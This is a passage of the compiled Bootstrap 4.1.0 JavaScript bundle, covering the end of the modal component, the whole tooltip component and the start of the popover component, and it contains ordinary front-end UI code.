    var DATA_KEY = 'bs.modal';
    var EVENT_KEY = "." + DATA_KEY;
    var DATA_API_KEY = '.data-api';
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key

    var Default = {
      backdrop: true,
      keyboard: true,
      focus: true,
      show: true
    };
    var DefaultType = {
      backdrop: '(boolean|string)',
      keyboard: 'boolean',
      focus: 'boolean',
      show: 'boolean'
    };
    var Event = {
      HIDE: "hide" + EVENT_KEY,
      HIDDEN: "hidden" + EVENT_KEY,
      SHOW: "show" + EVENT_KEY,
      SHOWN: "shown" + EVENT_KEY,
      FOCUSIN: "focusin" + EVENT_KEY,
      RESIZE: "resize" + EVENT_KEY,
      CLICK_DISMISS: "click.dismiss" + EVENT_KEY,
      KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEY,
      MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEY,
      MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEY,
      CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
    };
    var ClassName = {
      SCROLLBAR_MEASURER: 'modal-scrollbar-measure',
      BACKDROP: 'modal-backdrop',
      OPEN: 'modal-open',
      FADE: 'fade',
      SHOW: 'show'
    };
    var Selector = {
      DIALOG: '.modal-dialog',
      DATA_TOGGLE: '[data-toggle="modal"]',
      DATA_DISMISS: '[data-dismiss="modal"]',
      FIXED_CONTENT: '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',
      STICKY_CONTENT: '.sticky-top',
      NAVBAR_TOGGLER: '.navbar-toggler'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Modal =
      /*#__PURE__*/
      function () {
        function Modal(element, config) {
          this._config = this._getConfig(config);
          this._element = element;
          this._dialog = $$$1(element).find(Selector.DIALOG)[0];
          this._backdrop = null;
          this._isShown = false;
          this._isBodyOverflowing = false;
          this._ignoreBackdropClick = false;
          this._scrollbarWidth = 0;
        } // Getters


        var _proto = Modal.prototype;

        // Public
        _proto.toggle = function toggle(relatedTarget) {
          return this._isShown ? this.hide() : this.show(relatedTarget);
        };

        _proto.show = function show(relatedTarget) {
          var _this = this;

          if (this._isTransitioning || this._isShown) {
            return;
          }

          if ($$$1(this._element).hasClass(ClassName.FADE)) {
            this._isTransitioning = true;
          }

          var showEvent = $$$1.Event(Event.SHOW, {
            relatedTarget: relatedTarget
          });
          $$$1(this._element).trigger(showEvent);

          if (this._isShown || showEvent.isDefaultPrevented()) {
            return;
          }

          this._isShown = true;

          this._checkScrollbar();

          this._setScrollbar();

          this._adjustDialog();

          $$$1(document.body).addClass(ClassName.OPEN);

          this._setEscapeEvent();

          this._setResizeEvent();

          $$$1(this._element).on(Event.CLICK_DISMISS, Selector.DATA_DISMISS, function (event) {
            return _this.hide(event);
          });
          $$$1(this._dialog).on(Event.MOUSEDOWN_DISMISS, function () {
            $$$1(_this._element).one(Event.MOUSEUP_DISMISS, function (event) {
              if ($$$1(event.target).is(_this._element)) {
                _this._ignoreBackdropClick = true;
              }
            });
          });

          this._showBackdrop(function () {
            return _this._showElement(relatedTarget);
          });
        };

        _proto.hide = function hide(event) {
          var _this2 = this;

          if (event) {
            event.preventDefault();
          }

          if (this._isTransitioning || !this._isShown) {
            return;
          }

          var hideEvent = $$$1.Event(Event.HIDE);
          $$$1(this._element).trigger(hideEvent);

          if (!this._isShown || hideEvent.isDefaultPrevented()) {
            return;
          }

          this._isShown = false;
          var transition = $$$1(this._element).hasClass(ClassName.FADE);

          if (transition) {
            this._isTransitioning = true;
          }

          this._setEscapeEvent();

          this._setResizeEvent();

          $$$1(document).off(Event.FOCUSIN);
          $$$1(this._element).removeClass(ClassName.SHOW);
          $$$1(this._element).off(Event.CLICK_DISMISS);
          $$$1(this._dialog).off(Event.MOUSEDOWN_DISMISS);

          if (transition) {
            var transitionDuration = Util.getTransitionDurationFromElement(this._element);
            $$$1(this._element).one(Util.TRANSITION_END, function (event) {
              return _this2._hideModal(event);
            }).emulateTransitionEnd(transitionDuration);
          } else {
            this._hideModal();
          }
        };

        _proto.dispose = function dispose() {
          $$$1.removeData(this._element, DATA_KEY);
          $$$1(window, document, this._element, this._backdrop).off(EVENT_KEY);
          this._config = null;
          this._element = null;
          this._dialog = null;
          this._backdrop = null;
          this._isShown = null;
          this._isBodyOverflowing = null;
          this._ignoreBackdropClick = null;
          this._scrollbarWidth = null;
        };

        _proto.handleUpdate = function handleUpdate() {
          this._adjustDialog();
        }; // Private


        _proto._getConfig = function _getConfig(config) {
          config = _objectSpread({}, Default, config);
          Util.typeCheckConfig(NAME, config, DefaultType);
          return config;
        };

        _proto._showElement = function _showElement(relatedTarget) {
          var _this3 = this;

          var transition = $$$1(this._element).hasClass(ClassName.FADE);

          if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
            // Don't move modal's DOM position
            document.body.appendChild(this._element);
          }

          this._element.style.display = 'block';

          this._element.removeAttribute('aria-hidden');

          this._element.scrollTop = 0;

          if (transition) {
            Util.reflow(this._element);
          }

          $$$1(this._element).addClass(ClassName.SHOW);

          if (this._config.focus) {
            this._enforceFocus();
          }

          var shownEvent = $$$1.Event(Event.SHOWN, {
            relatedTarget: relatedTarget
          });

          var transitionComplete = function transitionComplete() {
            if (_this3._config.focus) {
              _this3._element.focus();
            }

            _this3._isTransitioning = false;
            $$$1(_this3._element).trigger(shownEvent);
          };

          if (transition) {
            var transitionDuration = Util.getTransitionDurationFromElement(this._element);
            $$$1(this._dialog).one(Util.TRANSITION_END, transitionComplete).emulateTransitionEnd(transitionDuration);
          } else {
            transitionComplete();
          }
        };

        _proto._enforceFocus = function _enforceFocus() {
          var _this4 = this;

          $$$1(document).off(Event.FOCUSIN) // Guard against infinite focus loop
            .on(Event.FOCUSIN, function (event) {
              if (document !== event.target && _this4._element !== event.target && $$$1(_this4._element).has(event.target).length === 0) {
                _this4._element.focus();
              }
            });
        };

        _proto._setEscapeEvent = function _setEscapeEvent() {
          var _this5 = this;

          if (this._isShown && this._config.keyboard) {
            $$$1(this._element).on(Event.KEYDOWN_DISMISS, function (event) {
              if (event.which === ESCAPE_KEYCODE) {
                event.preventDefault();

                _this5.hide();
              }
            });
          } else if (!this._isShown) {
            $$$1(this._element).off(Event.KEYDOWN_DISMISS);
          }
        };

        _proto._setResizeEvent = function _setResizeEvent() {
          var _this6 = this;

          if (this._isShown) {
            $$$1(window).on(Event.RESIZE, function (event) {
              return _this6.handleUpdate(event);
            });
          } else {
            $$$1(window).off(Event.RESIZE);
          }
        };

        _proto._hideModal = function _hideModal() {
          var _this7 = this;

          this._element.style.display = 'none';

          this._element.setAttribute('aria-hidden', true);

          this._isTransitioning = false;

          this._showBackdrop(function () {
            $$$1(document.body).removeClass(ClassName.OPEN);

            _this7._resetAdjustments();

            _this7._resetScrollbar();

            $$$1(_this7._element).trigger(Event.HIDDEN);
          });
        };

        _proto._removeBackdrop = function _removeBackdrop() {
          if (this._backdrop) {
            $$$1(this._backdrop).remove();
            this._backdrop = null;
          }
        };

        _proto._showBackdrop = function _showBackdrop(callback) {
          var _this8 = this;

          var animate = $$$1(this._element).hasClass(ClassName.FADE) ? ClassName.FADE : '';

          if (this._isShown && this._config.backdrop) {
            this._backdrop = document.createElement('div');
            this._backdrop.className = ClassName.BACKDROP;

            if (animate) {
              $$$1(this._backdrop).addClass(animate);
            }

            $$$1(this._backdrop).appendTo(document.body);
            $$$1(this._element).on(Event.CLICK_DISMISS, function (event) {
              if (_this8._ignoreBackdropClick) {
                _this8._ignoreBackdropClick = false;
                return;
              }

              if (event.target !== event.currentTarget) {
                return;
              }

              if (_this8._config.backdrop === 'static') {
                _this8._element.focus();
              } else {
                _this8.hide();
              }
            });

            if (animate) {
              Util.reflow(this._backdrop);
            }

            $$$1(this._backdrop).addClass(ClassName.SHOW);

            if (!callback) {
              return;
            }

            if (!animate) {
              callback();
              return;
            }

            var backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);
            $$$1(this._backdrop).one(Util.TRANSITION_END, callback).emulateTransitionEnd(backdropTransitionDuration);
          } else if (!this._isShown && this._backdrop) {
            $$$1(this._backdrop).removeClass(ClassName.SHOW);

            var callbackRemove = function callbackRemove() {
              _this8._removeBackdrop();

              if (callback) {
                callback();
              }
            };

            if ($$$1(this._element).hasClass(ClassName.FADE)) {
              var _backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);

              $$$1(this._backdrop).one(Util.TRANSITION_END, callbackRemove).emulateTransitionEnd(_backdropTransitionDuration);
            } else {
              callbackRemove();
            }
          } else if (callback) {
            callback();
          }
        }; // ----------------------------------------------------------------------
        // the following methods are used to handle overflowing modals
        // todo (fat): these should probably be refactored out of modal.js
        // ----------------------------------------------------------------------


        _proto._adjustDialog = function _adjustDialog() {
          var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;

          if (!this._isBodyOverflowing && isModalOverflowing) {
            this._element.style.paddingLeft = this._scrollbarWidth + "px";
          }

          if (this._isBodyOverflowing && !isModalOverflowing) {
            this._element.style.paddingRight = this._scrollbarWidth + "px";
          }
        };

        _proto._resetAdjustments = function _resetAdjustments() {
          this._element.style.paddingLeft = '';
          this._element.style.paddingRight = '';
        };

        _proto._checkScrollbar = function _checkScrollbar() {
          var rect = document.body.getBoundingClientRect();
          this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;
          this._scrollbarWidth = this._getScrollbarWidth();
        };

        _proto._setScrollbar = function _setScrollbar() {
          var _this9 = this;

          if (this._isBodyOverflowing) {
            // Note: DOMNode.style.paddingRight returns the actual value or '' if not set
            //   while $(DOMNode).css('padding-right') returns the calculated value or 0 if not set
            // Adjust fixed content padding
            $$$1(Selector.FIXED_CONTENT).each(function (index, element) {
              var actualPadding = $$$1(element)[0].style.paddingRight;
              var calculatedPadding = $$$1(element).css('padding-right');
              $$$1(element).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + _this9._scrollbarWidth + "px");
            }); // Adjust sticky content margin

            $$$1(Selector.STICKY_CONTENT).each(function (index, element) {
              var actualMargin = $$$1(element)[0].style.marginRight;
              var calculatedMargin = $$$1(element).css('margin-right');
              $$$1(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) - _this9._scrollbarWidth + "px");
            }); // Adjust navbar-toggler margin

            $$$1(Selector.NAVBAR_TOGGLER).each(function (index, element) {
              var actualMargin = $$$1(element)[0].style.marginRight;
              var calculatedMargin = $$$1(element).css('margin-right');
              $$$1(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) + _this9._scrollbarWidth + "px");
            }); // Adjust body padding

            var actualPadding = document.body.style.paddingRight;
            var calculatedPadding = $$$1(document.body).css('padding-right');
            $$$1(document.body).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + this._scrollbarWidth + "px");
          }
        };

        _proto._resetScrollbar = function _resetScrollbar() {
          // Restore fixed content padding
          $$$1(Selector.FIXED_CONTENT).each(function (index, element) {
            var padding = $$$1(element).data('padding-right');

            if (typeof padding !== 'undefined') {
              $$$1(element).css('padding-right', padding).removeData('padding-right');
            }
          }); // Restore sticky content and navbar-toggler margin

          $$$1(Selector.STICKY_CONTENT + ", " + Selector.NAVBAR_TOGGLER).each(function (index, element) {
            var margin = $$$1(element).data('margin-right');

            if (typeof margin !== 'undefined') {
              $$$1(element).css('margin-right', margin).removeData('margin-right');
            }
          }); // Restore body padding

          var padding = $$$1(document.body).data('padding-right');

          if (typeof padding !== 'undefined') {
            $$$1(document.body).css('padding-right', padding).removeData('padding-right');
          }
        };

        _proto._getScrollbarWidth = function _getScrollbarWidth() {
          // thx d.walsh
          var scrollDiv = document.createElement('div');
          scrollDiv.className = ClassName.SCROLLBAR_MEASURER;
          document.body.appendChild(scrollDiv);
          var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
          document.body.removeChild(scrollDiv);
          return scrollbarWidth;
        }; // Static


        Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            var _config = _objectSpread({}, Modal.Default, $$$1(this).data(), typeof config === 'object' && config);

            if (!data) {
              data = new Modal(this, _config);
              $$$1(this).data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config](relatedTarget);
            } else if (_config.show) {
              data.show(relatedTarget);
            }
          });
        };

        _createClass(Modal, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }]);

        return Modal;
      }();
    /**
     * ------------------------------------------------------------------------
     * Data Api implementation
     * ------------------------------------------------------------------------
     */


    $$$1(document).on(Event.CLICK_DATA_API, Selector.DATA_TOGGLE, function (event) {
      var _this10 = this;

      var target;
      var selector = Util.getSelectorFromElement(this);

      if (selector) {
        target = $$$1(selector)[0];
      }

      var config = $$$1(target).data(DATA_KEY) ? 'toggle' : _objectSpread({}, $$$1(target).data(), $$$1(this).data());

      if (this.tagName === 'A' || this.tagName === 'AREA') {
        event.preventDefault();
      }

      var $target = $$$1(target).one(Event.SHOW, function (showEvent) {
        if (showEvent.isDefaultPrevented()) {
          // Only register focus restorer if modal will actually get shown
          return;
        }

        $target.one(Event.HIDDEN, function () {
          if ($$$1(_this10).is(':visible')) {
            _this10.focus();
          }
        });
      });

      Modal._jQueryInterface.call($$$1(target), config, this);
    });
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */

    $$$1.fn[NAME] = Modal._jQueryInterface;
    $$$1.fn[NAME].Constructor = Modal;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Modal._jQueryInterface;
    };

    return Modal;
  }($);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): tooltip.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Tooltip = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'tooltip';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.tooltip';
    var EVENT_KEY = "." + DATA_KEY;
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var CLASS_PREFIX = 'bs-tooltip';
    var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');
    var DefaultType = {
      animation: 'boolean',
      template: 'string',
      title: '(string|element|function)',
      trigger: 'string',
      delay: '(number|object)',
      html: 'boolean',
      selector: '(string|boolean)',
      placement: '(string|function)',
      offset: '(number|string)',
      container: '(string|element|boolean)',
      fallbackPlacement: '(string|array)',
      boundary: '(string|element)'
    };
    var AttachmentMap = {
      AUTO: 'auto',
      TOP: 'top',
      RIGHT: 'right',
      BOTTOM: 'bottom',
      LEFT: 'left'
    };
    var Default = {
      animation: true,
      template: '<div class="tooltip" role="tooltip">' + '<div class="arrow"></div>' + '<div class="tooltip-inner"></div></div>',
      trigger: 'hover focus',
      title: '',
      delay: 0,
      html: false,
      selector: false,
      placement: 'top',
      offset: 0,
      container: false,
      fallbackPlacement: 'flip',
      boundary: 'scrollParent'
    };
    var HoverState = {
      SHOW: 'show',
      OUT: 'out'
    };
    var Event = {
      HIDE: "hide" + EVENT_KEY,
      HIDDEN: "hidden" + EVENT_KEY,
      SHOW: "show" + EVENT_KEY,
      SHOWN: "shown" + EVENT_KEY,
      INSERTED: "inserted" + EVENT_KEY,
      CLICK: "click" + EVENT_KEY,
      FOCUSIN: "focusin" + EVENT_KEY,
      FOCUSOUT: "focusout" + EVENT_KEY,
      MOUSEENTER: "mouseenter" + EVENT_KEY,
      MOUSELEAVE: "mouseleave" + EVENT_KEY
    };
    var ClassName = {
      FADE: 'fade',
      SHOW: 'show'
    };
    var Selector = {
      TOOLTIP: '.tooltip',
      TOOLTIP_INNER: '.tooltip-inner',
      ARROW: '.arrow'
    };
    var Trigger = {
      HOVER: 'hover',
      FOCUS: 'focus',
      CLICK: 'click',
      MANUAL: 'manual'
      /**
       * ------------------------------------------------------------------------
       * Class Definition
       * ------------------------------------------------------------------------
       */

    };

    var Tooltip =
      /*#__PURE__*/
      function () {
        function Tooltip(element, config) {
          /**
           * Check for Popper dependency
           * Popper - https://popper.js.org
           */
          if (typeof Popper === 'undefined') {
            throw new TypeError('Bootstrap tooltips require Popper.js (https://popper.js.org)');
          } // private


          this._isEnabled = true;
          this._timeout = 0;
          this._hoverState = '';
          this._activeTrigger = {};
          this._popper = null; // Protected

          this.element = element;
          this.config = this._getConfig(config);
          this.tip = null;

          this._setListeners();
        } // Getters


        var _proto = Tooltip.prototype;

        // Public
        _proto.enable = function enable() {
          this._isEnabled = true;
        };

        _proto.disable = function disable() {
          this._isEnabled = false;
        };

        _proto.toggleEnabled = function toggleEnabled() {
          this._isEnabled = !this._isEnabled;
        };

        _proto.toggle = function toggle(event) {
          if (!this._isEnabled) {
            return;
          }

          if (event) {
            var dataKey = this.constructor.DATA_KEY;
            var context = $$$1(event.currentTarget).data(dataKey);

            if (!context) {
              context = new this.constructor(event.currentTarget, this._getDelegateConfig());
              $$$1(event.currentTarget).data(dataKey, context);
            }

            context._activeTrigger.click = !context._activeTrigger.click;

            if (context._isWithActiveTrigger()) {
              context._enter(null, context);
            } else {
              context._leave(null, context);
            }
          } else {
            if ($$$1(this.getTipElement()).hasClass(ClassName.SHOW)) {
              this._leave(null, this);

              return;
            }

            this._enter(null, this);
          }
        };

        _proto.dispose = function dispose() {
          clearTimeout(this._timeout);
          $$$1.removeData(this.element, this.constructor.DATA_KEY);
          $$$1(this.element).off(this.constructor.EVENT_KEY);
          $$$1(this.element).closest('.modal').off('hide.bs.modal');

          if (this.tip) {
            $$$1(this.tip).remove();
          }

          this._isEnabled = null;
          this._timeout = null;
          this._hoverState = null;
          this._activeTrigger = null;

          if (this._popper !== null) {
            this._popper.destroy();
          }

          this._popper = null;
          this.element = null;
          this.config = null;
          this.tip = null;
        };

        _proto.show = function show() {
          var _this = this;

          if ($$$1(this.element).css('display') === 'none') {
            throw new Error('Please use show on visible elements');
          }

          var showEvent = $$$1.Event(this.constructor.Event.SHOW);

          if (this.isWithContent() && this._isEnabled) {
            $$$1(this.element).trigger(showEvent);
            var isInTheDom = $$$1.contains(this.element.ownerDocument.documentElement, this.element);

            if (showEvent.isDefaultPrevented() || !isInTheDom) {
              return;
            }

            var tip = this.getTipElement();
            var tipId = Util.getUID(this.constructor.NAME);
            tip.setAttribute('id', tipId);
            this.element.setAttribute('aria-describedby', tipId);
            this.setContent();

            if (this.config.animation) {
              $$$1(tip).addClass(ClassName.FADE);
            }

            var placement = typeof this.config.placement === 'function' ? this.config.placement.call(this, tip, this.element) : this.config.placement;

            var attachment = this._getAttachment(placement);

            this.addAttachmentClass(attachment);
            var container = this.config.container === false ? document.body : $$$1(this.config.container);
            $$$1(tip).data(this.constructor.DATA_KEY, this);

            if (!$$$1.contains(this.element.ownerDocument.documentElement, this.tip)) {
              $$$1(tip).appendTo(container);
            }

            $$$1(this.element).trigger(this.constructor.Event.INSERTED);
            this._popper = new Popper(this.element, tip, {
              placement: attachment,
              modifiers: {
                offset: {
                  offset: this.config.offset
                },
                flip: {
                  behavior: this.config.fallbackPlacement
                },
                arrow: {
                  element: Selector.ARROW
                },
                preventOverflow: {
                  boundariesElement: this.config.boundary
                }
              },
              onCreate: function onCreate(data) {
                if (data.originalPlacement !== data.placement) {
                  _this._handlePopperPlacementChange(data);
                }
              },
              onUpdate: function onUpdate(data) {
                _this._handlePopperPlacementChange(data);
              }
            });
            $$$1(tip).addClass(ClassName.SHOW); // If this is a touch-enabled device we add extra
            // empty mouseover listeners to the body's immediate children;
            // only needed because of broken event delegation on iOS
            // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html

            if ('ontouchstart' in document.documentElement) {
              $$$1(document.body).children().on('mouseover', null, $$$1.noop);
            }

            var complete = function complete() {
              if (_this.config.animation) {
                _this._fixTransition();
              }

              var prevHoverState = _this._hoverState;
              _this._hoverState = null;
              $$$1(_this.element).trigger(_this.constructor.Event.SHOWN);

              if (prevHoverState === HoverState.OUT) {
                _this._leave(null, _this);
              }
            };

            if ($$$1(this.tip).hasClass(ClassName.FADE)) {
              var transitionDuration = Util.getTransitionDurationFromElement(this.tip);
              $$$1(this.tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
            } else {
              complete();
            }
          }
        };

        _proto.hide = function hide(callback) {
          var _this2 = this;

          var tip = this.getTipElement();
          var hideEvent = $$$1.Event(this.constructor.Event.HIDE);

          var complete = function complete() {
            if (_this2._hoverState !== HoverState.SHOW && tip.parentNode) {
              tip.parentNode.removeChild(tip);
            }

            _this2._cleanTipClass();

            _this2.element.removeAttribute('aria-describedby');

            $$$1(_this2.element).trigger(_this2.constructor.Event.HIDDEN);

            if (_this2._popper !== null) {
              _this2._popper.destroy();
            }

            if (callback) {
              callback();
            }
          };

          $$$1(this.element).trigger(hideEvent);

          if (hideEvent.isDefaultPrevented()) {
            return;
          }

          $$$1(tip).removeClass(ClassName.SHOW); // If this is a touch-enabled device we remove the extra
          // empty mouseover listeners we added for iOS support

          if ('ontouchstart' in document.documentElement) {
            $$$1(document.body).children().off('mouseover', null, $$$1.noop);
          }

          this._activeTrigger[Trigger.CLICK] = false;
          this._activeTrigger[Trigger.FOCUS] = false;
          this._activeTrigger[Trigger.HOVER] = false;

          if ($$$1(this.tip).hasClass(ClassName.FADE)) {
            var transitionDuration = Util.getTransitionDurationFromElement(tip);
            $$$1(tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
          } else {
            complete();
          }

          this._hoverState = '';
        };

        _proto.update = function update() {
          if (this._popper !== null) {
            this._popper.scheduleUpdate();
          }
        }; // Protected


        _proto.isWithContent = function isWithContent() {
          return Boolean(this.getTitle());
        };

        _proto.addAttachmentClass = function addAttachmentClass(attachment) {
          $$$1(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);
        };

        _proto.getTipElement = function getTipElement() {
          this.tip = this.tip || $$$1(this.config.template)[0];
          return this.tip;
        };

        _proto.setContent = function setContent() {
          var $tip = $$$1(this.getTipElement());
          this.setElementContent($tip.find(Selector.TOOLTIP_INNER), this.getTitle());
          $tip.removeClass(ClassName.FADE + " " + ClassName.SHOW);
        };

        _proto.setElementContent = function setElementContent($element, content) {
          var html = this.config.html;

          if (typeof content === 'object' && (content.nodeType || content.jquery)) {
            // Content is a DOM node or a jQuery
            if (html) {
              if (!$$$1(content).parent().is($element)) {
                $element.empty().append(content);
              }
            } else {
              $element.text($$$1(content).text());
            }
          } else {
            $element[html ? 'html' : 'text'](content);
          }
        };

        _proto.getTitle = function getTitle() {
          var title = this.element.getAttribute('data-original-title');

          if (!title) {
            title = typeof this.config.title === 'function' ? this.config.title.call(this.element) : this.config.title;
          }

          return title;
        }; // Private


        _proto._getAttachment = function _getAttachment(placement) {
          return AttachmentMap[placement.toUpperCase()];
        };

        _proto._setListeners = function _setListeners() {
          var _this3 = this;

          var triggers = this.config.trigger.split(' ');
          triggers.forEach(function (trigger) {
            if (trigger === 'click') {
              $$$1(_this3.element).on(_this3.constructor.Event.CLICK, _this3.config.selector, function (event) {
                return _this3.toggle(event);
              });
            } else if (trigger !== Trigger.MANUAL) {
              var eventIn = trigger === Trigger.HOVER ? _this3.constructor.Event.MOUSEENTER : _this3.constructor.Event.FOCUSIN;
              var eventOut = trigger === Trigger.HOVER ? _this3.constructor.Event.MOUSELEAVE : _this3.constructor.Event.FOCUSOUT;
              $$$1(_this3.element).on(eventIn, _this3.config.selector, function (event) {
                return _this3._enter(event);
              }).on(eventOut, _this3.config.selector, function (event) {
                return _this3._leave(event);
              });
            }

            $$$1(_this3.element).closest('.modal').on('hide.bs.modal', function () {
              return _this3.hide();
            });
          });

          if (this.config.selector) {
            this.config = _objectSpread({}, this.config, {
              trigger: 'manual',
              selector: ''
            });
          } else {
            this._fixTitle();
          }
        };

        _proto._fixTitle = function _fixTitle() {
          var titleType = typeof this.element.getAttribute('data-original-title');

          if (this.element.getAttribute('title') || titleType !== 'string') {
            this.element.setAttribute('data-original-title', this.element.getAttribute('title') || '');
            this.element.setAttribute('title', '');
          }
        };

        _proto._enter = function _enter(event, context) {
          var dataKey = this.constructor.DATA_KEY;
          context = context || $$$1(event.currentTarget).data(dataKey);

          if (!context) {
            context = new this.constructor(event.currentTarget, this._getDelegateConfig());
            $$$1(event.currentTarget).data(dataKey, context);
          }

          if (event) {
            context._activeTrigger[event.type === 'focusin' ? Trigger.FOCUS : Trigger.HOVER] = true;
          }

          if ($$$1(context.getTipElement()).hasClass(ClassName.SHOW) || context._hoverState === HoverState.SHOW) {
            context._hoverState = HoverState.SHOW;
            return;
          }

          clearTimeout(context._timeout);
          context._hoverState = HoverState.SHOW;

          if (!context.config.delay || !context.config.delay.show) {
            context.show();
            return;
          }

          context._timeout = setTimeout(function () {
            if (context._hoverState === HoverState.SHOW) {
              context.show();
            }
          }, context.config.delay.show);
        };

        _proto._leave = function _leave(event, context) {
          var dataKey = this.constructor.DATA_KEY;
          context = context || $$$1(event.currentTarget).data(dataKey);

          if (!context) {
            context = new this.constructor(event.currentTarget, this._getDelegateConfig());
            $$$1(event.currentTarget).data(dataKey, context);
          }

          if (event) {
            context._activeTrigger[event.type === 'focusout' ? Trigger.FOCUS : Trigger.HOVER] = false;
          }

          if (context._isWithActiveTrigger()) {
            return;
          }

          clearTimeout(context._timeout);
          context._hoverState = HoverState.OUT;

          if (!context.config.delay || !context.config.delay.hide) {
            context.hide();
            return;
          }

          context._timeout = setTimeout(function () {
            if (context._hoverState === HoverState.OUT) {
              context.hide();
            }
          }, context.config.delay.hide);
        };

        _proto._isWithActiveTrigger = function _isWithActiveTrigger() {
          for (var trigger in this._activeTrigger) {
            if (this._activeTrigger[trigger]) {
              return true;
            }
          }

          return false;
        };

        _proto._getConfig = function _getConfig(config) {
          config = _objectSpread({}, this.constructor.Default, $$$1(this.element).data(), config);

          if (typeof config.delay === 'number') {
            config.delay = {
              show: config.delay,
              hide: config.delay
            };
          }

          if (typeof config.title === 'number') {
            config.title = config.title.toString();
          }

          if (typeof config.content === 'number') {
            config.content = config.content.toString();
          }

          Util.typeCheckConfig(NAME, config, this.constructor.DefaultType);
          return config;
        };

        _proto._getDelegateConfig = function _getDelegateConfig() {
          var config = {};

          if (this.config) {
            for (var key in this.config) {
              if (this.constructor.Default[key] !== this.config[key]) {
                config[key] = this.config[key];
              }
            }
          }

          return config;
        };

        _proto._cleanTipClass = function _cleanTipClass() {
          var $tip = $$$1(this.getTipElement());
          var tabClass = $tip.attr('class').match(BSCLS_PREFIX_REGEX);

          if (tabClass !== null && tabClass.length > 0) {
            $tip.removeClass(tabClass.join(''));
          }
        };

        _proto._handlePopperPlacementChange = function _handlePopperPlacementChange(data) {
          this._cleanTipClass();

          this.addAttachmentClass(this._getAttachment(data.placement));
        };

        _proto._fixTransition = function _fixTransition() {
          var tip = this.getTipElement();
          var initConfigAnimation = this.config.animation;

          if (tip.getAttribute('x-placement') !== null) {
            return;
          }

          $$$1(tip).removeClass(ClassName.FADE);
          this.config.animation = false;
          this.hide();
          this.show();
          this.config.animation = initConfigAnimation;
        }; // Static


        Tooltip._jQueryInterface = function _jQueryInterface(config) {
          return this.each(function () {
            var data = $$$1(this).data(DATA_KEY);

            var _config = typeof config === 'object' && config;

            if (!data && /dispose|hide/.test(config)) {
              return;
            }

            if (!data) {
              data = new Tooltip(this, _config);
              $$$1(this).data(DATA_KEY, data);
            }

            if (typeof config === 'string') {
              if (typeof data[config] === 'undefined') {
                throw new TypeError("No method named \"" + config + "\"");
              }

              data[config]();
            }
          });
        };

        _createClass(Tooltip, null, [{
          key: "VERSION",
          get: function get() {
            return VERSION;
          }
        }, {
          key: "Default",
          get: function get() {
            return Default;
          }
        }, {
          key: "NAME",
          get: function get() {
            return NAME;
          }
        }, {
          key: "DATA_KEY",
          get: function get() {
            return DATA_KEY;
          }
        }, {
          key: "Event",
          get: function get() {
            return Event;
          }
        }, {
          key: "EVENT_KEY",
          get: function get() {
            return EVENT_KEY;
          }
        }, {
          key: "DefaultType",
          get: function get() {
            return DefaultType;
          }
        }]);

        return Tooltip;
      }();
    /**
     * ------------------------------------------------------------------------
     * jQuery
     * ------------------------------------------------------------------------
     */


    $$$1.fn[NAME] = Tooltip._jQueryInterface;
    $$$1.fn[NAME].Constructor = Tooltip;

    $$$1.fn[NAME].noConflict = function () {
      $$$1.fn[NAME] = JQUERY_NO_CONFLICT;
      return Tooltip._jQueryInterface;
    };

    return Tooltip;
  }($, Popper);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.1.0): popover.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  var Popover = function ($$$1) {
    /**
     * ------------------------------------------------------------------------
     * Constants
     * ------------------------------------------------------------------------
     */
    var NAME = 'popover';
    var VERSION = '4.1.0';
    var DATA_KEY = 'bs.popover';
    var EVENT_KEY = "." + DATA_KEY;
    var JQUERY_NO_CONFLICT = $$$1.fn[NAME];
    var CLASS_PREFIX = 'bs-popover';
    var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');

    var Default = _objectSpread({}, Tooltip.Default, {
      placement: 'right',
      trigger: 'click',
      content: '',
